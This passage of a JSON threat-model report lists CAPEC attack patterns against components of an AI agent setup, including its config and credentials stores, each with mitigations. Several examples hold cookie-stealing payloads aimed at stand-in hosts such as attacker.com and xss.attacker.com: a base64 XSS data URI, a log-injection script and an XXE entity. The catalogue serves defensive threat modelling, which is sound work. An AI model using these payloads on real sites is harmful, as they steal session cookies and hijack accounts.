pull off any unprotected session identifiers. The attacker can then use these variables and access the application.", "id": "246", "mitigations": "Design: utilize strong federated identity such as SAML to encrypt and sign identity tokens in transit.Implementation: Use industry standards session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf.Implementation: If the session identifier is used for authentication, such as in the so-called single sign on use cases, then ensure that it is protected at the same level of assurance as authentication tokens.Implementation: If the web or application server supports it, then encrypting and/or signing the session ID (such as cookie) can protect the ID if intercepted.Design: Use strong session identifiers that are protected in transit and at rest.Implementation: Utilize a session timeout for all sessions, for example 20 minutes. If the user does not explicitly logout, the server terminates their session after this period of inactivity. If the user logs back in then a new session key is generated.Implementation: Verify of authenticity of all session IDs at runtime.", "references": "https://capec.mitre.org/data/definitions/21.html, http://cwe.mitre.org/data/definitions/290.html, http://cwe.mitre.org/data/definitions/346.html, http://cwe.mitre.org/data/definitions/664.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "AA03"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Functionality Misuse", "details": "An adversary leverages a legitimate capability of an application in such a way as to achieve a negative technical impact. The system functionality is not altered or modified but used in a way that was not intended. This is often accomplished through the overuse of a specific functionality or by leveraging functionality with design flaws that enables the adversary to gain access to unauthorized, sensitive data.", "example": "An attacker clicks on the 'forgot password' and is presented with a single security question. The question is regarding the name of the first dog of the user. The system does not limit the number of attempts to provide the dog's name. An attacker goes through a list of 100 most popular dog names and finds the right name, thus getting the ability to reset the password and access the system.", "id": "247", "mitigations": "Perform comprehensive threat modeling, a process of identifying, evaluating, and mitigating potential threats to the application. This effort can help reveal potentially obscure application functionality that can be manipulated for malicious purposes.When implementing security features, consider how they can be misused and compromised.", "references": "https://capec.mitre.org/data/definitions/212.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AC09"}, {"assumption": null, "condition": "target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "Fuzzing and observing application log data/errors for application mapping", "details": "An attacker sends random, malformed, or otherwise unexpected messages to a target application and observes the application's log or error messages returned. Fuzzing techniques involve sending random or malformed messages to a target and monitoring the target's response. The attacker does not initially know how a target will respond to individual messages but by attempting a large number of message variants they may find a variant that trigger's desired behavior. In this attack, the purpose of the fuzzing is to observe the application's log and error messages, although fuzzing a target can also sometimes cause the target to enter an unstable state, causing a crash. By observing logs and error messages, the attacker can learn details about the configuration of the target application and might be able to cause the target to disclose sensitive information.", "example": "The following code generates an error message that leaks the full pathname of the configuration file. $ConfigDir = /home/myprog/config;$uname = GetUserInput(username);ExitError(Bad hacker!) if ($uname !~ /^w+$/);$file = $ConfigDir/$uname.txt;if (! (-e $file)) { ExitError(Error: $file does not exist); }... If this code is running on a server, such as a web application, then the person making the request should not know what the full pathname of the configuration directory is. By submitting a username that does not produce a $file that exists, an attacker could get this pathname. It could then be used to exploit path traversal or symbolic link following problems that may exist elsewhere in the application.", "id": "248", "mitigations": "Design: Construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are catalogued and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.Design: wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.Implementation: Obfuscate server fields of HTTP response.Implementation: Hide inner ordering of HTTP response header.Implementation: Customizing HTTP error codes such as 404 or 500.Implementation: Hide HTTP response header software information filed.Implementation: Hide cookie's software information filed.Implementation: Obfuscate database type in Database API's error message.", "references": "https://capec.mitre.org/data/definitions/215.html, http://cwe.mitre.org/data/definitions/209.html, http://cwe.mitre.org/data/definitions/532.html", "response": "", "severity": "Low", "target": "Node Host Agent", "threat_id": "INP18"}, {"assumption": null, "condition": "target.controls.implementsServerSideValidation is False and (target.controls.providesIntegrity is False or target.controls.authorizesSource is False)", "cvss": "", "description": "Exploiting Trust in Client", "details": "An attack of this type exploits vulnerabilities in client/server communication channel authentication and data integrity. It leverages the implicit trust a server places in the client, or more importantly, that which the server believes is the client. An attacker executes this type of attack by placing themselves in the communication channel between client and server such that communication directly to the server is possible where the server believes it is communicating only with a valid client. There are numerous variations of this type of attack.", "example": "Web applications may use JavaScript to perform client side validation, request encoding/formatting, and other security functions, which provides some usability benefits and eliminates some client-server round-tripping. However, the web server cannot assume that the requests it receives have been subject to those validations, because an attacker can use an alternate method for crafting the HTTP Request and submit data that contains poisoned values designed to spoof a user and/or get the web server to disclose information.Web 2.0 style applications may be particularly vulnerable because they in large part rely on existing infrastructure which provides scalability without the ability to govern the clients. Attackers identify vulnerabilities that either assume the client side is responsible for some security services (without the requisite ability to ensure enforcement of these checks) and/or the lack of a hardened, default deny server configuration that allows for an attacker probing for weaknesses in unexpected ways. Client side validation, request formatting and other services may be performed, but these are strictly usability enhancements not security enhancements.Many web applications use client side scripting like JavaScript to enforce authentication, authorization, session state and other variables, but at the end of day they all make requests to the server. These client side checks may provide usability and performance gains, but they lack integrity in terms of the http request. It is possible for an attacker to post variables directly to the server without using any of the client script security checks and customize the patterns to impersonate other users or probe for more information.Many message oriented middleware systems like MQ Series are rely on information that is passed along with the message request for making authorization decisions, for example what group or role the request should be passed. However, if the message server does not or cannot authenticate the authorization information in the request then the server's policy decisions about authorization are trivial to subvert because the client process can simply elevate privilege by passing in elevated group or role information which the message server accepts and acts on.", "id": "249", "mitigations": "Design: Ensure that client process and/or message is authenticated so that anonymous communications and/or messages are not accepted by the system.Design: Do not rely on client validation or encoding for security purposes.Design: Utilize digital signatures to increase authentication assurance.Design: Utilize two factor authentication to increase authentication assurance.Implementation: Perform input validation for all remote content.", "references": "https://capec.mitre.org/data/definitions/22.html, http://cwe.mitre.org/data/definitions/287.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "AA04"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "XML External Entities Blowup", "details": "This attack takes advantage of the entity replacement property of XML where the value of the replacement is a URI. A well-crafted XML document could have the entity refer to a URI that consumes a large amount of resources to create a denial of service condition. This can cause the system to either freeze, crash, or execute arbitrary code depending on the URI.", "example": "In this example, the XML parser parses the attacker's XML and opens the malicious URI where the attacker controls the server and writes a massive amount of data to the response stream. In this example the malicious URI is a large file transfer. <?xml version=1.0?>< !DOCTYPE bomb [<!ENTITY detonate SYSTEM http://www.malicious-badguy.com/myhugefile.exe>]><bomb>&detonate;</bomb>", "id": "250", "mitigations": "This attack may be mitigated by tweaking the XML parser to not resolve external entities. If external entities are needed, then implement a custom XmlResolver that has a request timeout, data retrieval limit, and restrict resources it can retrieve locally.", "references": "https://capec.mitre.org/data/definitions/221.html, http://cwe.mitre.org/data/definitions/611.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP19"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Credential Falsification through Manipulation", "details": "An attacker manipulates an existing credential in order to gain access to a target application. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. An attacker may be able to manipulate a credential sniffed from an existing connection in order to gain access to a target server. For example, a credential in the form of a web cookie might have a field that indicates the access rights of a user. By manually tweaking this cookie, a user might be able to increase their access rights to the server. Alternately an attacker may be able to manipulate an existing credential to appear as a different user. This attack differs from falsification through prediction in that the user bases their modified credentials off existing credentials instead of using patterns detected in prior credentials to create a new credential that is accepted because it fits the pattern. As a result, an attacker may be able to impersonate other users or elevate their permissions to a targeted service.", "example": "An adversary uses client side scripting(JavaScript) to set session ID in the victim's browser using document.cookie. This fixates a falsified session credential into victim's browser with the help of a crafted URL link. Once the victim clicks on the link, the attacker is able to bypass authentication or piggyback off some other authenticated victim's session.", "id": "251", "mitigations": "Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult. Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.", "references": "https://capec.mitre.org/data/definitions/226.html, http://cwe.mitre.org/data/definitions/565.html, http://cwe.mitre.org/data/definitions/472.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "AC11"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "DTD Injection", "details": "An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.", "example": "Adversary injects XML External Entity (XEE) attack that can cause the disclosure of confidential information, execute abitrary code, create a Denial of Service of the targeted server, or several other malicious impacts.", "id": "252", "mitigations": "Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.Implementation: Disallow the inclusion of DTDs as part of incoming messages.Implementation: Use XML parsing tools that protect against DTD attacks.", "references": "https://capec.mitre.org/data/definitions/228.html, http://cwe.mitre.org/data/definitions/829.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP21"}, {"assumption": null, "condition": "target.usesXMLParser is False or target.controls.disablesDTD is False", "cvss": "", "description": "XML Attribute Blowup", "details": "This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition owhere CPU resources are exhausted because of the parsing algorithm.", "example": "In this example, assume that the victim is running a vulnerable parser such as .NET framework 1.0. This results in a quadratic runtime of O(n^2). <?xml version=1.0?><fooaaa=ZZZ=...999=/> A document with n attributes results in (n^2)/2 operations to be performed. If an operation takes 100 nanoseconds then a document with 100,000 operations would take 500s to process. In this fashion a small message of less than 1MB causes a denial of service condition on the CPU resources.", "id": "253", "mitigations": "This attack may be mitigated completely by using a parser that is not using a vulnerable container. Mitigation may also limit the number of attributes per XML element.", "references": "https://capec.mitre.org/data/definitions/229.html, http://cwe.mitre.org/data/definitions/770.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP22"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Targeting URI Placeholders", "details": "An attack of this type exploits the ability of most browsers to interpret data, javascript or other URI schemes as client-side executable content placeholders. This attack consists of passing a malicious URI in an anchor tag HREF attribute or any other similar attributes in other HTML tags. Such malicious URI contains, for example, a base64 encoded HTML content with an embedded cross-site scripting payload. The attack is executed when the browser interprets the malicious content i.e., for example, when the victim clicks on the malicious link.", "example": "The following payload data: text/html;base64,PGh0bWw+PGJvZHk+PHNjcmlwdD52YXIgaW1nID0gbmV3IEltYWdlKCk7IGltZy5zcmMgPSAiaHR0cDovL2F0dGFja2VyLmNvbS9jb29raWVncmFiYmVyPyIrIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5jb29raWVzKTs8L3NjcmlwdD48L2JvZHk+PC9odG1sPg== represents a base64 encoded HTML and uses the data URI scheme to deliver it to the browser. The decoded payload is the following piece of HTML code: <html><body><script>var img = new Image();img.src = http://attacker.com/cookiegrabber?+ encodeURIComponent(document.cookies); </script> </body> </html> Web applications that take user controlled inputs and reflect them in URI HTML placeholder without a proper validation are at risk for such an attack. An attacker could inject the previous payload that would be placed in a URI placeholder (for example in the anchor tag HREF attribute): <a href=INJECTION_POINT>My Link</a> Once the victim clicks on the link, the browser will decode and execute the content from the payload. This will result on the execution of the cross-site scripting attack.", "id": "254", "mitigations": "Design: Use browser technologies that do not allow client side scripting.Design: Utilize strict type, character, and encoding enforcement.Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.Implementation: Ensure all content coming from the client is using the same encoding; if not, the server-side application must canonicalize the data before applying any filtering.Implementation: Perform input validation for all remote content, including remote and user-generated contentImplementation: Perform output validation for all remote content.Implementation: Disable scripting languages such as JavaScript in browserImplementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.", "references": "https://capec.mitre.org/data/definitions/244.html, http://cwe.mitre.org/data/definitions/83.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP28"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.sanitizesInput is False or target.controls.encodesOutput is False", "cvss": "", "description": "XSS Using Doubled Characters", "details": "The attacker bypasses input validation by using doubled characters in order to perform a cross-site scripting attack. Some filters fail to recognize dangerous sequences if they are preceded by repeated characters. For example, by doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "example": "By doubling the < before a script command, (<<script or %3C%3script using URI encoding) the filters of some web applications may fail to recognize the presence of a script tag. If the targeted server is vulnerable to this type of bypass, the attacker can create a crafted URL or other trap to cause a victim to view a page on the targeted server where the malicious content is executed, as per a normal XSS attack.", "id": "255", "mitigations": "Design: Use libraries and templates that minimize unfiltered input.Implementation: Normalize, filter and sanitize all user supplied fields.Implementation: The victim should configure the browser to minimize active content from untrusted sources.", "references": "https://capec.mitre.org/data/definitions/245.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP29"}, {"assumption": null, "condition": "target.controls.checksInputBounds is False", "cvss": "", "description": "SOAP Array Overflow", "details": "An attacker sends a SOAP request with an array whose actual length exceeds the length indicated in the request. When a data structure including a SOAP array is instantiated, the sender transmits the size of the array as an explicit parameter along with the data. If the server processing the transmission naively trusts the specified size, then an attacker can intentionally understate the size of the array, possibly resulting in a buffer overflow if the server attempts to read the entire data set into the memory it allocated for a smaller array. This, in turn, can lead to a server crash or even the execution of arbitrary code.", "example": "Refer to this example - http://projects.webappsec.org/w/page/13246962/SOAP%20Array%20Abuse", "id": "256", "mitigations": "If the server either verifies the correctness of the stated array size or if the server stops processing an array once the stated number of elements have been read, regardless of the actual array size, then this attack will fail. The former detects the malformed SOAP message while the latter ensures that the server does not attempt to load more data than was allocated for.", "references": "https://capec.mitre.org/data/definitions/256.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP34"}, {"assumption": null, "condition": "target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False", "cvss": "", "description": "HTTP Response Smuggling", "details": "An attacker injects content into a server response that is interpreted differently by intermediaries than it is by the target browser. To do this, it takes advantage of inconsistent or incorrect interpretations of the HTTP protocol by various applications. For example, it might use different block terminating characters (CR or LF alone), adding duplicate header fields that browsers interpret as belonging to separate responses, or other techniques. Consequences of this attack can include response-splitting, cross-site scripting, apparent defacement of targeted sites, cache poisoning, or similar actions.", "example": "The attacker targets the cache service used by the organization to reduce load on the internet bandwidth. This server can be a cache server on the LAN or other application server caching the static WebPages. The attacker sends three different HTTP request as shown - Request 1: POST request for http://www.netbanking.com, Request 2: GET request for http:www.netbanking.com/FD.html, Request 3: GET request for http://www.netbanking.com/FD-Rates.html. Due to malformed request cache server assumes request 1 and 3 as valid request and forwards the entire request to the webserver. Webserver which strictly follow then HTTP parsing rule responds with the http://www.netbanking.com/FD.html  HTML page. This is happened because webserver consider request 1 and 2 as valid one. Cache server stores this response against the request 3. When normal users request for page http://www.netbanking.com/FD-Rates.html, cache server responds with the page http://www.netbanking.com/FD.html.Hence attacker will succeeds in cache poisoning.", "id": "257", "mitigations": "Design: Employ strict adherence to interpretations of HTTP messages wherever possible.Implementation: Encode header information provided by user input so that user-supplied content is not interpreted by intermediaries.", "references": "https://capec.mitre.org/data/definitions/273.html", "response": "", "severity": "Medium", "target": "Node Host Agent", "threat_id": "INP36"}, {"assumption": null, "condition": "target.controls.implementsStrictHTTPValidation is False and target.controls.encodesHeaders is False", "cvss": "", "description": "HTTP Request Smuggling", "details": "HTTP Request Smuggling results from the discrepancies in parsing HTTP requests between HTTP entities such as web caching proxies or application firewalls. Entities such as web servers, web caching proxies, application firewalls or simple proxies often parse HTTP requests in slightly different ways. Under specific situations where there are two or more such entities in the path of the HTTP request, a specially crafted request is seen by two attacked entities as two different sets of requests. This allows certain requests to be smuggled through to a second entity without the first one realizing it.", "example": "When using Sun Java System Web Proxy Server 3.x or 4.x in conjunction with Sun ONE/iPlanet 6.x, Sun Java System Application Server 7.x or 8.x, it is possible to bypass certain application firewall protections, hijack web sessions, perform Cross Site Scripting or poison the web proxy cache using HTTP Request Smuggling. Differences in the way HTTP requests are parsed by the Proxy Server and the Application Server enable malicious requests to be smuggled through to the Application Server, thereby exposing the Application Server to aforementioned attacks. See also: CVE-2006-6276Apache server 2.0.45 and version before 1.3.34, when used as a proxy, easily lead to web cache poisoning and bypassing of application firewall restrictions because of non-standard HTTP behavior. Although the HTTP/1.1 specification clearly states that a request with both Content-Length and a Transfer-Encoding: chunked headers is invalid, vulnerable versions of Apache accept such requests and reassemble the ones with Transfer-Encoding: chunked header without replacing the existing Content-Length header or adding its own. This leads to HTTP Request Smuggling using a request with a chunked body and a header with Content-Length: 0. See also: CVE-2005-2088", "id": "258", "mitigations": "HTTP Request Smuggling is usually targeted at web servers. Therefore, in such cases, careful analysis of the entities must occur during system design prior to deployment. If there are known differences in the way the entities parse HTTP requests, the choice of entities needs consideration.Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.", "references": "https://capec.mitre.org/data/definitions/33.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "INP37"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Credential Falsification through Prediction", "details": "This attack targets predictable session ID in order to gain privileges. The attacker can predict the session ID used during a transaction to perform spoofing and session hijacking.", "example": "Jetty before 4.2.27, 5.1 before 5.1.12, 6.0 before 6.0.2, and 6.1 before 6.1.0pre3 generates predictable session identifiers using java.util.random, which makes it easier for remote attackers to guess a session identifier through brute force attacks, bypass authentication requirements, and possibly conduct cross-site request forgery attacks. See also: CVE-2006-6969mod_usertrack in Apache 1.3.11 through 1.3.20 generates session ID's using predictable information including host IP address, system time and server process ID, which allows local users to obtain session ID's and bypass authentication when these session ID's are used for authentication. See also: CVE-2001-1534", "id": "259", "mitigations": "Use a strong source of randomness to generate a session ID.Use adequate length session IDs. Do not use information available to the user in order to generate session ID (e.g., time).Ideas for creating random numbers are offered by Eastlake [RFC1750]. Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.", "references": "https://capec.mitre.org/data/definitions/59.html", "response": "", "severity": "High", "target": "Node Host Agent", "threat_id": "AC16"}, {"assumption": null, "condition": "target.controls.usesStrongSessionIdentifiers is False", "cvss": "", "description": "Session Hijacking - ServerSide", "details": "This type of attack involves an adversary that exploits weaknesses in an application's use of sessions in performing authentication. The advarsary is able to steal or manipulate an active session and use it to gain unathorized access to the application.", "example": "Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim\u2019s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.", "id": "260", "mitigations": "Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.", "references": "https://capec.mitre.org/data/definitions/593.html", "response": "", "severity": "Very High", "target": "Node Host Agent", "threat_id": "AC17"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "261", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Config Store (moltbot.json)", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "262", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Config Store (moltbot.json)", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "263", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Config Store (moltbot.json)", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Audit Log Manipulation", "details": "The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.", "example": "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).", "id": "264", "mitigations": "Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.", "references": "https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html", "response": "", "severity": "High", "target": "Config Store (moltbot.json)", "threat_id": "DE04"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of privilege to access resources that should be (but are not) reserved for higher privilege accounts. Likewise, the adversary does not exploit trust or subvert systems - all control functionality is working as configured but the configuration does not adequately protect sensitive resources at an appropriate level.", "example": "An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.", "id": "265", "mitigations": "Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.", "references": "https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html", "response": "", "severity": "Medium", "target": "Credentials Store (~/.clawdbot/credentials)", "threat_id": "AC01"}, {"assumption": null, "condition": "target.controls.handlesResourceConsumption is False", "cvss": "", "description": "Excessive Allocation", "details": "An adversary causes the target to allocate excessive resources to servicing the attackers' request, thereby reducing the resources available for legitimate services and degrading or denying services. Usually, this attack focuses on memory allocation, but any finite resource on the target could be the attacked, including bandwidth, processing cycles, or other resources. This attack does not attempt to force this allocation through a large number of requests (that would be Resource Depletion through Flooding) but instead uses one or a small number of requests that are carefully formatted to force the target to allocate excessive resources to service this request(s). Often this attack takes advantage of a bug in the target to cause the target to allocate resources vastly beyond what would be needed for a normal request.", "example": "In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.", "id": "266", "mitigations": "Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.", "references": "https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html", "response": "", "severity": "Medium", "target": "Credentials Store (~/.clawdbot/credentials)", "threat_id": "DO02"}, {"assumption": null, "condition": "target.controls.usesEncryptionAlgorithm != 'RSA' and target.controls.usesEncryptionAlgorithm != 'AES'", "cvss": "", "description": "Encryption Brute Forcing", "details": "An attacker, armed with the cipher text and the encryption algorithm used, performs an exhaustive (brute force) search on the key space to determine the key that decrypts the cipher text to obtain the plaintext.", "example": "In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.", "id": "267", "mitigations": "Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore's law needs to be taken into account that suggests that computing resources double every eighteen months.", "references": "https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html", "response": "", "severity": "Low", "target": "Credentials Store (~/.clawdbot/credentials)", "threat_id": "CR05"}, {"assumption": null, "condition": "target.controls.validatesInput is False or target.controls.implementsPOLP is False", "cvss": "", "description": "Audit Log Manipulation", "details": "The attacker injects, manipulates, deletes, or forges malicious log entries into the log file, in an attempt to mislead an audit of the log file or cover tracks of an attack. Due to either insufficient access controls of the log files or the logging mechanism, the attacker is able to perform such actions.", "example": "The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain <script>new Image().src='http://xss.attacker.com/log_cookie?cookie='+encodeURI(document.cookie);</script> The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).", "id": "268", "mitigations": "Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.", "references": "https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html", "response": "", "severity": "High", "target": "Credentials Store (~/.clawdbot/credentials)", "threat_id": "DE04"}, {"assumption": null, "condition": "target.controls.hasAccessControl is False or target.controls.authorizesSource is False", "cvss": "", "description": "Privilege Abuse", "details": "An adversary is able to exploit features of the target that should be reserved for privileged users or administrators but are exposed to use by lower or non-privileged accounts. Access to sensitive information and functionality must be controlled to ensure that only authorized users are able to access these resources. If access control mechanisms are absent or misconfigured, a user may be able to access resources that are intended only for higher level users. An adversary may be able to exploit this to utilize a less trusted account to gain information and perform activities reserved for more trusted accounts. This attack differs from privilege escalation and other privilege stealing attacks in that the adversary never actually escalates their privileges but instead is able to use a lesser degree of 